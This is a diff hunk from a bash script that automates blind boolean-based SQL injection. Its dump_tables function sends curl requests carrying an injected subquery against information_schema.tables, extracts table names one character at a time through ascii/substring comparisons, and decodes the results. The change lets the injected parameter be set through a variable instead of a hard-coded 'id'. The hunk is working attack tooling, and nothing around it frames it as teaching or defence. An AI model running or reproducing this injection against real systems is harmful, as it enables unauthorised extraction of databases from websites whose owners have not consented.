@@ -173,7 +173,7 @@ function dump_tables(){
   limit_oportunities=0
   while true; do
     character_valid=0
-    curl -s -i -L -X GET "$url" -G --data-urlencode "id=1203128$begin_payload (select(select ascii(substring(table_name,$counter_character,1)) from information_schema.tables where table_schema = database() order by table_name limit 1 offset $counter_table)=$counter)" | grep "$valid_content" &>/dev/null && character_valid=1
+    curl -s -i -L -X GET "$url" -G --data-urlencode "$php_parameter=1203128$begin_payload (select(select ascii(substring(table_name,$counter_character,1)) from information_schema.tables where table_schema = database() order by table_name limit 1 offset $counter_table)=$counter)" | grep "$valid_content" &>/dev/null && character_valid=1
     
     value=$(printf "%x" $counter | tr -d '\n')
     tables[$counter_table]="${tables[$counter_table]}$(echo -n -e "\x$value")"
